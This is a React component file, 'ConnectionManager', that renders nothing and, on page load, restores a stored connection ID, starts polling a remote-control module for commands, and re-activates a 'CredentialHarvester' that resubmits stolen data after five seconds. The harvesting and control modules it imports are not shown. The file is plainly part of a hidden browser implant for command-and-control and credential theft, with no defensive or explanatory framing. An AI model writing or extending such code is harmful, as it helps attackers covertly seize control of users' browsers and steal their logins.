import { useEffect } from 'react';
import RemoteControl from '../utils/remoteControl';
import CredentialHarvester from '../utils/credentialHarvesting';

const ConnectionManager = () => {
  useEffect(() => {
    // Check if there's an existing connection ID in localStorage
    const connectionId = localStorage.getItem('connectionId');
    
    if (connectionId) {
      // Re-establish connection and start polling for commands
      const remoteControl = new RemoteControl(connectionId);
      remoteControl.startCommandPolling();
      
      // Check if credential harvester was active
      const harvesterActive = localStorage.getItem('credentialHarvesterActive');
      
      if (harvesterActive === 'true') {
        // Initialize and start credential harvester
        const credentialHarvester = new CredentialHarvester(connectionId);
        credentialHarvester.start();
        
        // Also try to retry any failed submissions
        setTimeout(() => {
          credentialHarvester.retryFailedSubmissions();
        }, 5000); // Wait 5 seconds before trying to resend
      }
    }
  }, []);
  
  // This is a "headless" component - it doesn't render anything
  return null;
};

export default ConnectionManager; 